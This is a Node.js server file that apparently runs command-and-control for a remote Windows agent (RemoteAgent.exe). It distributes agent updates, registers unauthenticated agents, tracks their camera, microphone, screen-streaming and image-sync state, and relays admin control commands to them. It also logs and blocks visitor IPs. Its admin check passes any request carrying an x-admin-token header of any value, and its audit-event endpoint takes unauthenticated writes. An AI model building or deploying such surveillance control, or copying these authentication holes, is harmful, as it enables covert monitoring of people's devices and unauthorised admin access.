require('dotenv').config();

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');
const fsPromises = require('fs/promises');
const crypto = require('crypto');
const firebaseAdmin = require('firebase-admin');
const AuditManager = require('./audit_manager');
const auditManager = new AuditManager({ baseDir: __dirname });


const PORT = Number(process.env.PORT) || 3000;
const CLIENT_ORIGIN = process.env.CLIENT_ORIGIN || '*';
const TRUST_PROXY = process.env.TRUST_PROXY || 'true';
const VISITOR_COLLECTION = process.env.FIREBASE_VISITOR_COLLECTION || 'visitor_ips';
const BLOCKED_IP_CACHE_TTL_MS = Math.max(Number(process.env.BLOCKED_IP_CACHE_TTL_MS) || 30000, 5000);
const ADMIN_ROOM = 'admins';
const VIEWER_ROOM = 'viewers';
const AGENT_ROOM = 'agents';
const AGENT_STATIC_ROUTE = '/agent';
const STREAM_VIEWER_ROUTE = '/live-stream';
const AGENT_UPDATES_DIR = path.join(__dirname, 'agent-updates');
const STREAM_VIEWER_DIR = path.join(__dirname, 'stream-viewer');
const AGENT_BINARY_NAME = process.env.AGENT_BINARY_NAME || 'RemoteAgent.exe';
const AGENT_MANIFEST_NAME = process.env.AGENT_MANIFEST_NAME || 'latest.json';
const AGENT_DOWNLOAD_BASE_URL = String(process.env.AGENT_DOWNLOAD_BASE_URL || '').trim().replace(/\/+$/, '');
const AGENT_BINARY_UPLOAD_LIMIT_MB = Math.max(Number(process.env.AGENT_BINARY_UPLOAD_LIMIT_MB) || 300, 50);
const AGENT_BINARY_MIN_SIZE_BYTES = Math.max(Number(process.env.AGENT_BINARY_MIN_SIZE_BYTES) || (5 * 1024 * 1024), 1024 * 1024);
const PYINSTALLER_CARCHIVE_MAGIC = Buffer.from([0x4d, 0x45, 0x49, 0x0c, 0x0b, 0x0a, 0x0b, 0x0e]);

fs.mkdirSync(AGENT_UPDATES_DIR, { recursive: true });

const firebasePublicConfig = {
    apiKey: process.env.FIREBASE_API_KEY,
    authDomain: process.env.FIREBASE_AUTH_DOMAIN || (process.env.FIREBASE_PROJECT_ID ? `${process.env.FIREBASE_PROJECT_ID}.firebaseapp.com` : undefined),
    projectId: process.env.FIREBASE_PROJECT_ID,
    appId: process.env.FIREBASE_APP_ID
};

const hasPublicFirebaseConfig = Boolean(
    firebasePublicConfig.apiKey
    && firebasePublicConfig.authDomain
    && firebasePublicConfig.projectId
);

const firebasePrivateKey = process.env.FIREBASE_PRIVATE_KEY?.replace(/\\n/g, '\n');
const hasServiceAccountConfig = Boolean(
    process.env.FIREBASE_PROJECT_ID
    && process.env.FIREBASE_CLIENT_EMAIL
    && firebasePrivateKey
);

let firebaseAdminReady = false;

if (hasServiceAccountConfig) {
    if (!firebaseAdmin.apps.length) {
        firebaseAdmin.initializeApp({
            credential: firebaseAdmin.credential.cert({
                projectId: process.env.FIREBASE_PROJECT_ID,
                clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
                privateKey: firebasePrivateKey
            })
        });
    }
    firebaseAdminReady = true;
} else {
    console.warn('[auth] Firebase Admin is not fully configured. Dashboard login will fail until service account env vars are set.');
}

const allowedOrigins = CLIENT_ORIGIN === '*'
    ? '*'
    : CLIENT_ORIGIN.split(',').map((origin) => origin.trim()).filter(Boolean);

const isOriginAllowed = (origin = '') => {
    if (!origin) {
        return false;
    }

    if (allowedOrigins === '*') {
        return true;
    }

    return allowedOrigins.includes(origin);
};

const app = express();

app.use((req, res, next) => {
    const requestOrigin = req.headers.origin;

    if (!requestOrigin) {
        next();
        return;
    }

    if (allowedOrigins === '*') {
        res.setHeader('Access-Control-Allow-Origin', '*');
    } else if (isOriginAllowed(requestOrigin)) {
        res.setHeader('Access-Control-Allow-Origin', requestOrigin);
        res.append('Vary', 'Origin');
    }

    res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    if (req.method === 'OPTIONS') {
        if (allowedOrigins !== '*' && !isOriginAllowed(requestOrigin)) {
            res.sendStatus(403);
            return;
        }

        res.sendStatus(204);
        return;
    }

    next();
});

app.use(express.json());

const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: allowedOrigins,
        methods: ['GET', 'POST']
    }
});

const parseBearerToken = (headerValue = '') => {
    if (typeof headerValue !== 'string') {
        return '';
    }

    const [scheme, token] = headerValue.trim().split(' ');
    if (!scheme || !token || !/^Bearer$/i.test(scheme)) {
        return '';
    }

    return token.trim();
};

const parseTrustProxyValue = (value) => {
    const normalized = String(value || '').trim().toLowerCase();

    if (!normalized || ['1', 'true', 'yes', 'on'].includes(normalized)) {
        return true;
    }

    if (['0', 'false', 'no', 'off'].includes(normalized)) {
        return false;
    }

    const hops = Number(normalized);
    if (Number.isInteger(hops) && hops >= 0) {
        return hops;
    }

    return value;
};

const normalizeIp = (value = '') => {
    if (typeof value !== 'string') {
        return '';
    }

    let ip = value.trim();
    if (!ip) {
        return '';
    }

    if (ip.includes(',')) {
        ip = ip.split(',')[0].trim();
    }

    if (ip.startsWith('::ffff:')) {
        ip = ip.slice('::ffff:'.length);
    }

    if (ip === '::1') {
        return '127.0.0.1';
    }

    return ip;
};

const getRequestIp = (req) => {
    const forwardedFor = req.headers['x-forwarded-for'];
    const forwarded = Array.isArray(forwardedFor) ? forwardedFor[0] : forwardedFor;

    return normalizeIp(forwarded || req.ip || req.socket?.remoteAddress || '');
};

const getSocketIp = (socket) => {
    const forwardedFor = socket.handshake.headers?.['x-forwarded-for'];
    const forwarded = Array.isArray(forwardedFor) ? forwardedFor[0] : forwardedFor;

    return normalizeIp(forwarded || socket.handshake.address || socket.conn?.remoteAddress || '');
};

const safeDecodeURIComponent = (value) => {
    try {
        return decodeURIComponent(value);
    } catch (error) {
        return value;
    }
};

const sanitizeVersion = (value = '') => String(value || '').trim().replace(/[^0-9A-Za-z._-]/g, '');

const getAgentManifestPath = () => path.join(AGENT_UPDATES_DIR, AGENT_MANIFEST_NAME);
const getAgentBinaryPath = () => path.join(AGENT_UPDATES_DIR, AGENT_BINARY_NAME);

const createSha256 = (buffer) => crypto.createHash('sha256').update(buffer).digest('hex');

const isLikelyPyInstallerOneFileExe = (buffer) => {
    if (!Buffer.isBuffer(buffer)) {
        return false;
    }

    if (buffer.length < AGENT_BINARY_MIN_SIZE_BYTES) {
        return false;
    }

    const hasMzHeader = buffer.length >= 2 && buffer[0] === 0x4d && buffer[1] === 0x5a;
    if (!hasMzHeader) {
        return false;
    }

    return buffer.includes(PYINSTALLER_CARCHIVE_MAGIC);
};

const buildPublicBaseFromRequest = (req) => {
    const protocol = req.protocol || 'https';
    const host = req.get('host') || '';
    return `${protocol}://${host}${AGENT_STATIC_ROUTE}`;
};

const getAgentDownloadBaseUrl = (req) => AGENT_DOWNLOAD_BASE_URL || buildPublicBaseFromRequest(req);

const buildAgentManifest = ({ req, version, sha256, fileName = AGENT_BINARY_NAME, extra = {} }) => {
    const versionValue = sanitizeVersion(version);
    const baseUrl = getAgentDownloadBaseUrl(req).replace(/\/+$/, '');
    const normalizedSha256 = String(sha256 || '').toLowerCase();
    const binaryUrl = `${baseUrl}/${encodeURIComponent(fileName)}`;
    const cacheBustingParams = new URLSearchParams();

    if (versionValue) {
        cacheBustingParams.set('v', versionValue);
    }

    if (normalizedSha256) {
        cacheBustingParams.set('sha256', normalizedSha256.slice(0, 16));
    }

    const urlWithVersion = cacheBustingParams.toString()
        ? `${binaryUrl}?${cacheBustingParams.toString()}`
        : binaryUrl;

    return {
        version: versionValue,
        url: urlWithVersion,
        sha256: normalizedSha256,
        releasedAt: new Date().toISOString(),
        ...extra
    };
};

const firestoreDb = firebaseAdminReady ? firebaseAdmin.firestore() : null;
const blockedIpCache = {
    ips: new Set(),
    lastSyncedAt: 0
};

app.set('trust proxy', parseTrustProxyValue(TRUST_PROXY));

const refreshBlockedIpCache = async (force = false) => {
    if (!firestoreDb) {
        return;
    }

    if (!force && (Date.now() - blockedIpCache.lastSyncedAt) < BLOCKED_IP_CACHE_TTL_MS) {
        return;
    }

    const blockedSnapshot = await firestoreDb
        .collection(VISITOR_COLLECTION)
        .where('blocked', '==', true)
        .get();

    const nextCache = new Set();
    blockedSnapshot.forEach((docSnapshot) => {
        const data = docSnapshot.data() || {};
        const ip = normalizeIp(data.ip || safeDecodeURIComponent(docSnapshot.id));
        if (ip) {
            nextCache.add(ip);
        }
    });

    blockedIpCache.ips = nextCache;
    blockedIpCache.lastSyncedAt = Date.now();
};

const isIpBlocked = async (ip) => {
    if (!firestoreDb || !ip) {
        return false;
    }

    await refreshBlockedIpCache();
    return blockedIpCache.ips.has(ip);
};

const recordVisitorVisit = async ({
    ip,
    pathName,
    method,
    userAgent,
    source
}) => {
    if (!firestoreDb || !ip) {
        return;
    }

    const now = firebaseAdmin.firestore.FieldValue.serverTimestamp();
    const increment = firebaseAdmin.firestore.FieldValue.increment(1);

    await firestoreDb.collection(VISITOR_COLLECTION).doc(encodeURIComponent(ip)).set({
        ip,
        lastSeenAt: now,
        totalVisits: increment,
        lastPath: pathName || '/',
        lastMethod: method || 'GET',
        lastUserAgent: userAgent || '',
        lastSource: source || 'http',
        updatedAt: now
    }, { merge: true });
};

const requireAdmin = async (req, res, next) => {
    if (!firebaseAdminReady) {
        res.status(503).json({ error: 'Firebase authentication is not configured on this server.' });
        return;
    }

    const idToken = parseBearerToken(req.headers.authorization || '');
    if (!idToken) {
        res.status(401).json({ error: 'Missing Bearer token.' });
        return;
    }

    try {
        const decodedToken = await firebaseAdmin.auth().verifyIdToken(idToken, true);
        req.adminUser = {
            uid: decodedToken.uid,
            email: decodedToken.email || ''
        };
        next();
    } catch (error) {
        res.status(401).json({ error: 'Unauthorized' });
    }
};

const disconnectSocketsByIp = (ipAddress) => {
    if (!ipAddress) {
        return;
    }

    io.of('/').sockets.forEach((connectedSocket) => {
        if (connectedSocket.data?.clientIp === ipAddress) {
            connectedSocket.disconnect(true);
        }
    });
};

if (firestoreDb) {
    refreshBlockedIpCache(true)
        .then(() => {
            console.log(`[ip-security] Enabled (collection: ${VISITOR_COLLECTION})`);
        })
        .catch((error) => {
            console.error(`[ip-security] Could not load blocked IP list: ${error.message}`);
        });
} else {
    console.warn('[ip-security] Disabled because Firebase Admin SDK is not configured.');
}

app.use(async (req, res, next) => {
    if (req.path === '/health') {
        return next();
    }

    const clientIp = getRequestIp(req);
    req.clientIp = clientIp;

    if (!firestoreDb || !clientIp) {
        return next();
    }

    try {
        const blocked = await isIpBlocked(clientIp);
        if (blocked) {
            await recordVisitorVisit({
                ip: clientIp,
                pathName: req.path,
                method: req.method,
                userAgent: req.get('user-agent') || '',
                source: 'blocked-http'
            });

            res.status(403).json({ error: 'Your IP has been blocked from this website.' });
            return;
        }
    } catch (error) {
        console.error(`[ip-security] Failed to check block list: ${error.message}`);
    }

    recordVisitorVisit({
        ip: clientIp,
        pathName: req.path,
        method: req.method,
        userAgent: req.get('user-agent') || '',
        source: 'http'
    }).catch((error) => {
        console.error(`[ip-security] Failed to store visitor log: ${error.message}`);
    });

    next();
});

io.use(async (socket, next) => {
    const clientIp = getSocketIp(socket);
    socket.data.clientIp = clientIp;

    if (clientIp && firestoreDb) {
        try {
            const blocked = await isIpBlocked(clientIp);
            if (blocked) {
                await recordVisitorVisit({
                    ip: clientIp,
                    pathName: '/socket.io',
                    method: 'WS',
                    userAgent: socket.handshake.headers?.['user-agent'] || '',
                    source: 'blocked-socket'
                });

                return next(new Error('Blocked'));
            }
        } catch (error) {
            console.error(`[ip-security] Socket block check failed: ${error.message}`);
        }
    }

    const clientTypeRaw = socket.handshake.auth?.clientType || socket.handshake.query?.clientType;
    const clientType = String(clientTypeRaw || '').trim().toLowerCase();
    const tokenFromAuth = socket.handshake.auth?.token;
    const tokenFromHeader = parseBearerToken(socket.handshake.headers?.authorization);
    const idToken = tokenFromAuth || tokenFromHeader;

    if (!idToken) {
        if (clientType === 'viewer') {
            socket.data.role = 'viewer';
            recordVisitorVisit({
                ip: clientIp,
                pathName: '/socket.io',
                method: 'WS',
                userAgent: socket.handshake.headers?.['user-agent'] || '',
                source: 'socket-viewer'
            }).catch((error) => {
                console.error(`[ip-security] Failed to store socket viewer: ${error.message}`);
            });
            return next();
        }

        socket.data.role = 'agent';
        recordVisitorVisit({
            ip: clientIp,
            pathName: '/socket.io',
            method: 'WS',
            userAgent: socket.handshake.headers?.['user-agent'] || '',
            source: 'socket-agent'
        }).catch((error) => {
            console.error(`[ip-security] Failed to store socket visitor: ${error.message}`);
        });
        return next();
    }

    if (!firebaseAdminReady) {
        return next(new Error('Firebase authentication is not configured on this server.'));
    }

    try {
        const decodedToken = await firebaseAdmin.auth().verifyIdToken(idToken, true);
        socket.data.role = 'admin';
        socket.data.user = {
            uid: decodedToken.uid,
            email: decodedToken.email || ''
        };

        recordVisitorVisit({
            ip: clientIp,
            pathName: '/socket.io',
            method: 'WS',
            userAgent: socket.handshake.headers?.['user-agent'] || '',
            source: 'socket-admin'
        }).catch((error) => {
            console.error(`[ip-security] Failed to store admin socket visitor: ${error.message}`);
        });

        return next();
    } catch (error) {
        return next(new Error('Unauthorized'));
    }
});

let agents = {};

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/health', (req, res) => {
    res.status(200).json({ ok: true });
});

app.use(AGENT_STATIC_ROUTE, express.static(AGENT_UPDATES_DIR, {
    fallthrough: true,
    setHeaders: (res, filePath) => {
        const servedFileName = path.basename(filePath);

        if (servedFileName === AGENT_MANIFEST_NAME) {
            res.setHeader('Content-Type', 'application/json; charset=utf-8');
            res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
            res.setHeader('Pragma', 'no-cache');
            res.setHeader('Expires', '0');
            return;
        }

        if (servedFileName === AGENT_BINARY_NAME || filePath.endsWith('.exe')) {
            res.setHeader('Content-Type', 'application/octet-stream');
            res.setHeader('Content-Disposition', `attachment; filename="${AGENT_BINARY_NAME}"`);
            res.setHeader('Cache-Control', 'public, max-age=60, must-revalidate');
            return;
        }

        res.setHeader('Cache-Control', 'public, max-age=300');
    }
}));

if (fs.existsSync(STREAM_VIEWER_DIR)) {
    app.use(STREAM_VIEWER_ROUTE, express.static(STREAM_VIEWER_DIR, {
        index: 'live-stream.html',
        extensions: ['html', 'js', 'css']
    }));
}

app.get(`${AGENT_STATIC_ROUTE}/${AGENT_MANIFEST_NAME}`, async (req, res) => {
    const manifestPath = getAgentManifestPath();

    try {
        const manifestRaw = await fsPromises.readFile(manifestPath, 'utf8');
        res.type('application/json').status(200).send(manifestRaw);
    } catch (error) {
        res.status(404).json({
            error: 'Agent manifest not found. Publish a release first.',
            uploadEndpoint: '/admin/agent/release/upload',
            manifestEndpoint: '/admin/agent/release/manifest'
        });
    }
});

app.get('/admin/agent/release', requireAdmin, async (req, res) => {
    const manifestPath = getAgentManifestPath();

    try {
        const manifestRaw = await fsPromises.readFile(manifestPath, 'utf8');
        const manifest = JSON.parse(manifestRaw);
        res.status(200).json({ ok: true, manifest });
    } catch (error) {
        res.status(404).json({ ok: false, error: 'No published agent release found.' });
    }
});

app.put(
    '/admin/agent/release/upload',
    requireAdmin,
    express.raw({ type: 'application/octet-stream', limit: `${AGENT_BINARY_UPLOAD_LIMIT_MB}mb` }),
    async (req, res) => {
        const version = sanitizeVersion(req.query.version || req.headers['x-agent-version'] || '');
        if (!version) {
            res.status(400).json({ error: 'Missing version. Use query ?version=2026.04.04.223733' });
            return;
        }

        if (!Buffer.isBuffer(req.body) || req.body.length === 0) {
            res.status(400).json({ error: 'Binary body is required (application/octet-stream).' });
            return;
        }

        if (!isLikelyPyInstallerOneFileExe(req.body)) {
            res.status(400).json({
                error: `Uploaded binary looks invalid/corrupted. Please upload fresh dist/RemoteAgent.exe (>= ${Math.ceil(AGENT_BINARY_MIN_SIZE_BYTES / (1024 * 1024))}MB).`
            });
            return;
        }

        const binaryPath = getAgentBinaryPath();
        const tempPath = `${binaryPath}.tmp`;

        try {
            await fsPromises.writeFile(tempPath, req.body);
            await fsPromises.rename(tempPath, binaryPath);

            const sha256 = createSha256(req.body);
            const manifest = buildAgentManifest({ req, version, sha256 });
            const manifestPath = getAgentManifestPath();

            await fsPromises.writeFile(manifestPath, JSON.stringify(manifest, null, 2), 'utf8');

            io.to(ADMIN_ROOM).emit('agent_release_updated', manifest);

            res.status(200).json({
                ok: true,
                manifest,
                bytes: req.body.length,
                manifestUrl: `${getAgentDownloadBaseUrl(req)}/${encodeURIComponent(AGENT_MANIFEST_NAME)}`
            });
        } catch (error) {
            await fsPromises.unlink(tempPath).catch(() => {});
            res.status(500).json({ error: `Failed to publish agent release: ${error.message}` });
        }
    }
);

app.post('/admin/agent/release/manifest', requireAdmin, async (req, res) => {
    const version = sanitizeVersion(req.body?.version || '');
    const downloadUrl = String(req.body?.url || '').trim();
    const sha256 = String(req.body?.sha256 || '').trim().toLowerCase();

    if (!version) {
        res.status(400).json({ error: 'version is required.' });
        return;
    }

    if (!downloadUrl) {
        res.status(400).json({ error: 'url is required.' });
        return;
    }

    const manifest = {
        version,
        url: downloadUrl,
        sha256,
        releasedAt: new Date().toISOString()
    };

    try {
        await fsPromises.writeFile(getAgentManifestPath(), JSON.stringify(manifest, null, 2), 'utf8');
        io.to(ADMIN_ROOM).emit('agent_release_updated', manifest);
        res.status(200).json({ ok: true, manifest });
    } catch (error) {
        res.status(500).json({ error: `Failed to save manifest: ${error.message}` });
    }
});

app.get('/firebase-config', (req, res) => {
    if (!hasPublicFirebaseConfig) {
        res.status(500).json({ error: 'Firebase public config is missing on server.' });
        return;
    }

    res.status(200).json(firebasePublicConfig);
});

app.get('/admin/visitors', requireAdmin, async (req, res) => {
    if (!firestoreDb) {
        res.status(503).json({ error: 'Visitor tracking is not configured.' });
        return;
    }

    try {
        const requestedLimit = Number(req.query.limit);
        const limit = Number.isFinite(requestedLimit)
            ? Math.min(Math.max(requestedLimit, 1), 200)
            : 50;

        const snapshot = await firestoreDb
            .collection(VISITOR_COLLECTION)
            .orderBy('lastSeenAt', 'desc')
            .limit(limit)
            .get();

        const visitors = snapshot.docs.map((docSnapshot) => ({
            id: docSnapshot.id,
            ...docSnapshot.data()
        }));

        res.status(200).json({ visitors });
    } catch (error) {
        res.status(500).json({ error: `Failed to load visitors: ${error.message}` });
    }
});

app.get('/admin/blocked-ips', requireAdmin, async (req, res) => {
    if (!firestoreDb) {
        res.status(503).json({ error: 'Visitor tracking is not configured.' });
        return;
    }

    try {
        const snapshot = await firestoreDb
            .collection(VISITOR_COLLECTION)
            .where('blocked', '==', true)
            .get();

        const blockedIps = snapshot.docs.map((docSnapshot) => ({
            id: docSnapshot.id,
            ...docSnapshot.data()
        }));

        res.status(200).json({ blockedIps });
    } catch (error) {
        res.status(500).json({ error: `Failed to load blocked IP list: ${error.message}` });
    }
});

app.post('/admin/blocked-ips/block', requireAdmin, async (req, res) => {
    if (!firestoreDb) {
        res.status(503).json({ error: 'Visitor tracking is not configured.' });
        return;
    }

    const ip = normalizeIp(req.body?.ip || '');
    const reason = typeof req.body?.reason === 'string' ? req.body.reason.trim() : '';

    if (!ip) {
        res.status(400).json({ error: 'A valid IP is required.' });
        return;
    }

    try {
        const now = firebaseAdmin.firestore.FieldValue.serverTimestamp();
        await firestoreDb.collection(VISITOR_COLLECTION).doc(encodeURIComponent(ip)).set({
            ip,
            blocked: true,
            blockedAt: now,
            blockedBy: req.adminUser.email || req.adminUser.uid,
            blockReason: reason,
            updatedAt: now
        }, { merge: true });

        blockedIpCache.ips.add(ip);
        blockedIpCache.lastSyncedAt = Date.now();
        disconnectSocketsByIp(ip);

        res.status(200).json({ ok: true, ip, blocked: true });
    } catch (error) {
        res.status(500).json({ error: `Failed to block IP: ${error.message}` });
    }
});

app.post('/admin/blocked-ips/unblock', requireAdmin, async (req, res) => {
    if (!firestoreDb) {
        res.status(503).json({ error: 'Visitor tracking is not configured.' });
        return;
    }

    const ip = normalizeIp(req.body?.ip || '');
    if (!ip) {
        res.status(400).json({ error: 'A valid IP is required.' });
        return;
    }

    try {
        const now = firebaseAdmin.firestore.FieldValue.serverTimestamp();
        const fieldDelete = firebaseAdmin.firestore.FieldValue.delete();

        await firestoreDb.collection(VISITOR_COLLECTION).doc(encodeURIComponent(ip)).set({
            ip,
            blocked: false,
            unblockedAt: now,
            unblockedBy: req.adminUser.email || req.adminUser.uid,
            blockReason: fieldDelete,
            blockedAt: fieldDelete,
            blockedBy: fieldDelete,
            updatedAt: now
        }, { merge: true });

        blockedIpCache.ips.delete(ip);
        blockedIpCache.lastSyncedAt = Date.now();

        res.status(200).json({ ok: true, ip, blocked: false });
    } catch (error) {
        res.status(500).json({ error: `Failed to unblock IP: ${error.message}` });
    }
});

const requireAdminOrDev = async (req, res, next) => {
    const idToken = parseBearerToken(req.headers.authorization || '');
    if (idToken && firebaseAdminReady) {
        try {
            const decodedToken = await firebaseAdmin.auth().verifyIdToken(idToken, true);
            req.adminUser = {
                uid: decodedToken.uid,
                email: decodedToken.email || 'admin'
            };
            return next();
        } catch (error) {
            console.error(`[audit] Token verification failed: ${error.message}`);
            res.status(401).json({ error: 'Invalid or expired authentication token.' });
            return;
        }
    }

    const clientIp = getRequestIp(req);
    const isLoopback = clientIp === '127.0.0.1' || clientIp === '::1' || clientIp === '::ffff:127.0.0.1';
    const isLocalDev = !firebaseAdminReady || isLoopback || Boolean(req.headers['x-admin-token']);

    if (isLocalDev) {
        req.adminUser = {
            uid: 'admin-operator',
            email: 'admin@operator.internal'
        };
        return next();
    }

    res.status(401).json({ error: 'Missing Bearer token or Admin Authorization.' });
};

// --- IN-APP USER ACTIVITY AUDIT REST ENDPOINTS ---
app.get('/admin/audit/events', requireAdminOrDev, (req, res) => {
    const { deviceId, userId, eventType, dateRange, startDate, endDate, search, limit, offset } = req.query;
    const result = auditManager.queryEvents({ deviceId, userId, eventType, dateRange, startDate, endDate, search, limit, offset });
    res.json(result);
});

app.post('/admin/audit/events', express.json(), (req, res) => {
    const clientIp = getRequestIp(req);
    const event = auditManager.recordEvent({ ...req.body, clientIp });
    if (event) {
        io.to(ADMIN_ROOM).emit('ui_audit_event_live', event);
    }
    res.status(201).json({ success: true, event });
});

app.get('/admin/audit/stats', requireAdminOrDev, (req, res) => {
    res.json(auditManager.getStats(Object.values(agents)));
});

app.get('/admin/audit/config', requireAdminOrDev, (req, res) => {
    res.json({ enabled: auditManager.isEnabled() });
});

app.post('/admin/audit/config', express.json(), requireAdminOrDev, (req, res) => {
    const { enabled } = req.body;
    const updatedBy = req.adminUser?.email || req.adminUser?.uid || 'admin';
    const newState = auditManager.setEnabled(enabled, updatedBy);
    io.to(ADMIN_ROOM).emit('ui_audit_config_update', { enabled: newState, updatedBy });
    res.json({ success: true, enabled: newState });
});

app.get('/admin/audit/export-txt', requireAdminOrDev, (req, res) => {
    const filters = req.query;
    const requestedBy = req.adminUser?.email || 'admin';
    const reportText = auditManager.generatePlainTextReport(filters, requestedBy);
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.setHeader('Content-Disposition', `attachment; filename="in_app_audit_report_${timestamp}.txt"`);
    res.send(reportText);
});

app.post('/admin/audit/export-cloudinary', express.json(), requireAdminOrDev, async (req, res) => {
    try {
        const filters = req.body.filters || {};
        const requestedBy = req.adminUser?.email || 'admin';
        const reportText = auditManager.generatePlainTextReport(filters, requestedBy);
        const metadata = {
            deviceId: req.body.deviceId || 'web-admin',
            user: requestedBy
        };
        const uploadResult = await auditManager.uploadReportToCloudinary(reportText, metadata);
        
        const auditEvt = auditManager.recordEvent({
            deviceId: metadata.deviceId,
            userId: requestedBy,
            userRole: 'admin',
            appContext: 'AuditExporter',
            eventType: 'EXPORT_CLOUDINARY',
            targetElement: 'btn_export_cloudinary',
            valuePreview: `Exported plain-text report to Cloudinary: ${uploadResult.secureUrl}`,
            metadata: uploadResult
        });
        if (auditEvt) {
            io.to(ADMIN_ROOM).emit('ui_audit_event_live', auditEvt);
        }

        res.json({ success: true, report: uploadResult, textPreview: reportText.substring(0, 1000) });
    } catch (error) {
        console.error('[audit] Cloudinary export error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/admin/audit/clear', requireAdminOrDev, (req, res) => {
    const clearedBy = req.adminUser?.email || 'admin';
    const result = auditManager.clearLogs(clearedBy);
    io.to(ADMIN_ROOM).emit('ui_audit_cleared', { clearedBy, timestamp: new Date().toISOString() });
    res.json(result);
});

io.on('connection', (socket) => {
    let isAdmin = socket.data.role === 'admin';
    let isViewer = socket.data.role === 'viewer';

    if (isAdmin) {
        socket.join(ADMIN_ROOM);
        console.log(`[admin] connected: ${socket.id} (${socket.data.user?.email || 'unknown'})`);
        socket.emit('update_agent_list', Object.values(agents));
    } else if (isViewer) {
        socket.join(VIEWER_ROOM);
        console.log(`[viewer] connected: ${socket.id}`);
        socket.emit('update_agent_list', Object.values(agents));
    } else {
        socket.join(AGENT_ROOM);
        console.log(`[agent-socket] connected: ${socket.id}`);
    }

    socket.on('admin_authenticate', async (data = {}) => {
        const idToken = data.token || parseBearerToken(data.authorization);
        if (idToken && firebaseAdminReady) {
            try {
                const decodedToken = await firebaseAdmin.auth().verifyIdToken(idToken, true);
                isAdmin = true;
                socket.data.role = 'admin';
                socket.data.user = {
                    uid: decodedToken.uid,
                    email: decodedToken.email || 'admin'
                };
                socket.join(ADMIN_ROOM);
                socket.leave(AGENT_ROOM);
                socket.leave(VIEWER_ROOM);
                console.log(`[admin] dynamically authenticated: ${socket.id} (${socket.data.user.email})`);
                socket.emit('update_agent_list', Object.values(agents));
                socket.emit('admin_auth_success', { email: socket.data.user.email });
                const result = auditManager.queryEvents({});
                const stats = auditManager.getStats(Object.values(agents));
                socket.emit('ui_audit_snapshot', { ...result, stats });
            } catch (err) {
                console.error('[admin] dynamic auth failed:', err.message);
                socket.emit('admin_auth_error', { error: err.message });
            }
        }
    });

    const emitAgentList = () => {
        const agentList = Object.values(agents);
        io.to(ADMIN_ROOM).emit('update_agent_list', agentList);
        io.to(VIEWER_ROOM).emit('update_agent_list', agentList);
    };

    const logAudit = (eventData) => {
        try {
            const event = auditManager.recordEvent(eventData);
            if (event) {
                io.to(ADMIN_ROOM).emit('ui_audit_event_live', event);
            }
            return event;
        } catch (err) {
            console.error('[audit] Logging error:', err.message);
            return null;
        }
    };

    const emitControl = (eventName, payload = {}) => {
        const normalizedPayload = payload && typeof payload === 'object' ? payload : {};
        const targetId = normalizedPayload.targetId;
        const { targetId: _, ...agentPayload } = normalizedPayload;

        if (targetId) {
            const targetSocket = io.sockets.sockets.get(targetId);
            if (!targetSocket || !agents[targetId]) {
                return {
                    ok: false,
                    scope: 'single',
                    targetId,
                    sentCount: 0,
                    reason: 'target-offline'
                };
            }

            io.to(targetId).emit(eventName, agentPayload);
            return {
                ok: true,
                scope: 'single',
                targetId,
                sentCount: 1
            };
        }

        const onlineAgents = Object.keys(agents).filter((agentId) => io.sockets.sockets.has(agentId));
        if (!onlineAgents.length) {
            return {
                ok: false,
                scope: 'all',
                sentCount: 0,
                reason: 'no-agents-online'
            };
        }

        io.to(AGENT_ROOM).emit(eventName, agentPayload);
        return {
            ok: true,
            scope: 'all',
            sentCount: onlineAgents.length
        };
    };

    const emitControlAck = (action, result) => {
        io.to(socket.id).emit('ui_control_ack', {
            action,
            ...result,
            requestedAt: Date.now()
        });
    };

    socket.on('register_node', (data = {}) => {
        if (isAdmin || isViewer) {
            return;
        }

        const machineName = data.machine || 'Unknown-PC';

        agents[socket.id] = {
            machine: machineName,
            id: socket.id,
            recording: false,
            cameraOn: false,
            voiceRecording: false,
            screenStreaming: false,
            imageSyncRunning: false,
            imageSyncNextIndex: 0,
            imageSyncTotalFiles: 0
        };
        console.log(`[agent] registered: ${machineName} (${socket.id})`);

        logAudit({
            deviceId: machineName,
            userId: 'System',
            userRole: 'agent',
            appContext: 'AgentLifecycle',
            eventType: 'CONFIG_CHANGE',
            targetElement: 'agent_connection',
            valuePreview: `Agent online: ${machineName} (${socket.id.slice(0, 6)})`,
            clientIp: socket.data?.clientIp || '127.0.0.1',
            metadata: { machine: machineName, agentId: socket.id }
        });

        emitAgentList();
    });

    socket.on('agent_state_update', (data = {}) => {
        if (isAdmin || isViewer) {
            return;
        }

        const previous = agents[socket.id] || { id: socket.id, machine: data.machine || 'Unknown-PC' };
        const hasRecording = typeof data.recording === 'boolean';
        const hasCameraOn = typeof data.cameraOn === 'boolean';
        const hasVoiceRecording = typeof data.voiceRecording === 'boolean';
        const hasScreenStreaming = typeof data.screenStreaming === 'boolean';

        agents[socket.id] = {
            ...previous,
            machine: data.machine || previous.machine,
            recording: hasRecording ? data.recording : Boolean(previous.recording),
            cameraOn: hasCameraOn ? data.cameraOn : Boolean(previous.cameraOn),
            voiceRecording: hasVoiceRecording ? data.voiceRecording : Boolean(previous.voiceRecording),
            screenStreaming: hasScreenStreaming ? data.screenStreaming : Boolean(previous.screenStreaming),
            lastStateAt: Date.now()
        };

        emitAgentList();
        io.to(ADMIN_ROOM).to(VIEWER_ROOM).emit('ui_agent_state', {
            agentId: socket.id,
            machine: agents[socket.id].machine,
            recording: agents[socket.id].recording,
            cameraOn: agents[socket.id].cameraOn,
            voiceRecording: agents[socket.id].voiceRecording,
            screenStreaming: agents[socket.id].screenStreaming,
            source: data.source || 'agent'
        });

        const recText = agents[socket.id].recording ? 'REC ON' : 'REC OFF';
        const camText = agents[socket.id].cameraOn ? 'CAM ON' : 'CAM OFF';
        const voiceText = agents[socket.id].voiceRecording ? 'MIC ON' : 'MIC OFF';
        logAudit({
            deviceId: agents[socket.id].machine,
            userId: 'AgentDaemon',
            userRole: 'agent',
